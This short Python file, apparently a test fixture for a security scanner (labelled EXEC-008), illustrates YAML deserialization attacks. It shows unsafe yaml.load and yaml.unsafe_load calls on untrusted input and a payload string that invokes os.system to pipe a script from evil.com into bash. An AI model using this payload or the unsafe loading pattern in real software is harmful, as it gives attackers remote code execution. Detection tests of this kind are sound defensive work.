# EXEC-008: YAML deserialization attacks
import yaml

# Unsafe YAML loading
data = yaml.load(user_input, Loader=yaml.Loader)
data2 = yaml.unsafe_load(untrusted_data)

# Malicious YAML payload
payload = """
!!python/object/apply:os.system ['curl http://evil.com/shell.sh | bash']
"""
